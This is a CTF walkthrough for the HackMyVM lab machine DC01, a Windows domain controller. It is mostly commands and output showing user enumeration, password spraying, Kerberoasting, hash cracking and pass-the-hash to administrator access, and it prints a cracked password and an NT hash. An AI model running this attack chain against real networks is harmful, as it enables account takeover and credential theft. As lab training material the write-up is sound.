---
title: CTF Walkthrough for HackMyVM Machine DC01
date: 2024-10-12 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Active Directory, Kerberoasting, Pass the Hash attack]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-12-dc01/box-dc01.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about DC01 a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Literal<br>
Goal: Get two flags<br>
OS: Windows<br>
Download link: [DC01](https://downloads.hackmyvm.eu/dc01.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) CrackMapExec<br>
4) SMBMap<br>
5) Impacket tools<br>
6) Hashcat<br>

## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Scans]
└─$ fping -aqg 10.0.2.16/24
<SNIP>                                                   
10.0.2.16
10.0.2.31
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/Service]
└─$ nmap -n -Pn -sC -sV 10.0.2.31 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 08:32 BST
Nmap scan report for 10.0.2.31
Host is up (0.00076s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-12 17:32:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-12T17:32:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:da:f6:15 (Oracle VirtualBox virtual NIC)
|_clock-skew: 9h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.94 seconds
```

The target runs Kerberos, LDAP, and SMB, we can deduce from this that the target is a Windows domain controller. We can see in the scan's result the domain i.e. `SOUPEDECODE.LOCAL` of the target and also the name of the domain controller `DC01`. We can add this information to our /etc/hosts file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/Service]
└─$ echo "10.0.2.31\tSOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
[sudo] password for pentester: 
10.0.2.31       SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
```

Now, let's enumerate the SMB service to see if it allows anonymous or guest logins.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Scans/AD Enumeration]
└─$ smbmap -H SOUPEDECODE.LOCAL -u 'guest'
<SNIP>

[+] IP: 10.0.2.31:445   Name: SOUPEDECODE.LOCAL         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections   
```

The target allows guest logins. We can use this to enumerate users in the domain through RID brute-forcing.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/AD Enumeration]
└─$ crackmapexec smb SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute > rid_bruteforce.txt

┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/AD Enumeration]
└─$ cat rid_bruteforce.txt | grep SidTypeUser | cut -d '\' -f2 | cut -d ' ' -f1 > valid_users.txt

┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/AD Enumeration]
└─$ wc -l valid_users.txt           
1069 valid_users.txt
```
## Exploitation

This gives us a list of 1069 users in the domain. An attempt to perform an ASREPRoasting attack will fail because all these accounts have Kerberos pre-authentication required attribute set. We can attempt a password spray attack. Users sometimes use their login names as their password so let's try to spray the username of each account as its password.
```
┌──(pentester㉿kali)-[~/…/HackMyVM/DC01/Scans/AD Enumeration]
└─$ crackmapexec smb SOUPEDECODE.LOCAL -u valid_users.txt -p valid_users.txt  --no-bruteforce   --continue-on-success | grep -v '[-]'
SMB                      SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\<REDACTED>:<REDACTED> 
```

This will yield a positive result for one account. We can now use these credentials and the username list we obtained above to enumerate service accounts on the target. This will fail if our attack host doesn't have the same time as the domain controller so before using Impacket scripts to kerberoast service accounts, we first need to change our time to that of the domain controller.
```bash
┌──(root㉿kali)-[/home/…/HackMyVM/DC01/Scans/AD Enumeration]
└─# timedatectl set-ntp off
┌──(root㉿kali)-[/home/…/HackMyVM/DC01/Scans/AD Enumeration]
└─# rdate -n  10.0.2.31 
┌──(root㉿kali)-[/home/…/HackMyVM/DC01/Scans/AD Enumeration]
└─# impacket-GetUserSPNs   SOUPEDECODE.LOCAL/ybob317 -dc-ip 10.0.2.31 -usersfile valid_users.txt

┌──(root㉿kali)-[/home/…/HackMyVM/DC01/Scans/AD Enumeration]
└─# impacket-GetUserSPNs   SOUPEDECODE.LOCAL/ybob317 -dc-ip 10.0.2.31 -usersfile valid_users.txt -request -outputfile spn-users.tgs                                                                               
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
Password:   
<SNIP>
```

After obtaining the TGS of service accounts on the target, we can use Hashcat to crack them.
```bash
┌──(root㉿kali)-[/home/…/HackMyVM/DC01/Scans/AD Enumeration]
└─# hashcat -a 0 -m 13100 spn-users.tgs /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$file_svc*$d8d2e01806c9713c384bd7ab7e684f5e$7f598f1ffc368974cefd2f02073150b221938220589e89234aacb6503fab6ec6b12c68b37564748<SNIP>b1634f79c4fac396d45f544cba11a8b14866aece56f2db9ca63964aee70602df89c2955916ce04aa7d962af72df3c273c6d7c8bdcfa8db05ba405578c90096696781ececb63f2f57fd3f6c1826bf8c7f7a4:<REDACTED>
```

We can see that Hashcat successfully cracked the TGS of the file_svc account. From the name of this account, we can deduce that it has a relationship with files file share services on the target so let's use it to enumerate shares on the DC.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01]
└─$ crackmapexec smb SOUPEDECODE.LOCAL -u file_svc -p 'Password123!!' --shares
SMB         SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Enumerated shares
SMB         SOUPEDECODE.LOCAL 445    DC01             Share           Permissions     Remark
SMB         SOUPEDECODE.LOCAL 445    DC01             -----           -----------     ------
SMB         SOUPEDECODE.LOCAL 445    DC01             ADMIN$                          Remote Admin
SMB         SOUPEDECODE.LOCAL 445    DC01             backup          READ            
SMB         SOUPEDECODE.LOCAL 445    DC01             C$                              Default share
SMB         SOUPEDECODE.LOCAL 445    DC01             IPC$            READ            Remote IPC
SMB         SOUPEDECODE.LOCAL 445    DC01             NETLOGON        READ            Logon server share 
SMB         SOUPEDECODE.LOCAL 445    DC01             SYSVOL          READ            Logon server share 
SMB         SOUPEDECODE.LOCAL 445    DC01             Users  
```

We see that we have access to an interesting share named backup. Let's connect to this share and enumerate its content.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ smbclient -U 'file_svc' //SOUPEDECODE.LOCAL/backup
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 18:41:17 2024
  ..                                 DR        0  Mon Jun 17 18:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 09:41:05 2024

                12942591 blocks of size 4096. 11001352 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (290.4 KiloBytes/sec) (average 49.8 KiloBytes/sec)
smb: \> exit

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ cat backup_extract.txt                                                    
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

We can see that the backup share on the DC01 contained a text file with NTLM password hashes of service accounts on the target. We can try to spread these hashes to the usernames we enumerated earlier to check the occurrence of any password re-used.<br>
*NB: In real-world penetration testing, it’s crucial to limit the number of password spray attempts based on the account lockout policy in the environment. This precaution helps prevent the accidental locking of sensitive accounts, which could disrupt our client's operations.*
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ cat backup_extract.txt | cut -d '$' -f1 > names.txt
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ cat backup_extract.txt | cut -d ':' -f4 > hashes.txt

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ crackmapexec smb SOUPEDECODE.LOCAL -u ../Scans/AD\ Enumeration/valid_users.txt  -H hashes.txt | grep -v '[-]'
SMB                      SOUPEDECODE.LOCAL 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:<REDACTED> (Pwn3d!)
```


We obtained a successful hit on the `FileServer$` user. The `(Pwn3d!)` indicates that this account can connect locally to the DC01. We can check this by enumerating the permissions this account has on the shares hosted on the DC01. We can connect to the DC01 using WinRM protocol as shown below.
```shell
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/DC01/Misc File]
└─$ evil-winrm -i 10.0.2.31 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559                                   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami
soupedecode\fileserver$
```

## Post Exploitation

Now that we have remote access to the DC01, we can enumerate the permissions of the `fileserver$` user on the target.
```shell
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami /all
USER INFORMATION
----------------

User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065

GROUP INFORMATION
-----------------
Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================                                   
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group                                                
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State                                                                                                                          
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled                                                                                                                                                                                                       
USER CLAIMS INFORMATION                                                       
-----------------------                                                       

User claims unknown.                                                          

Kerberos support for Dynamic Access Control on this device has been disabled.   
```

The enumeration shows that this account is a member of the Administrators group. We can use this to read both flags on the target as shown below.
```bash
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/4/2024   3:49 PM                admin
d-----         6/15/2024  12:56 PM                Administrator
d-----        10/12/2024   1:52 PM                FileServer$
d-r---         6/15/2024  10:54 AM                Public
d-----         6/17/2024  10:24 AM                ybob317

*Evil-WinRM* PS C:\Users> ls  ybob317\Desktop

    Directory: C:\Users\ybob317\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   4:54 AM             32 user.txt

*Evil-WinRM* PS C:\Users> ls administrator\desktop

    Directory: C:\Users\administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         6/17/2024  10:44 AM             32 root.txt
```
> Optionally, we could use this account to perform a DSync attack to extract all the hashes in the domain controller
{: .prompt-tip }


## Conclusion

Congratulations! In this walkthrough, you have used an SMB null session to enumerate users on the target. Finally, you leverage a succession of weak passwords to compromise different accounts on the system that gave you administrator access. This machine was designed to show how the use of weak passwords could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
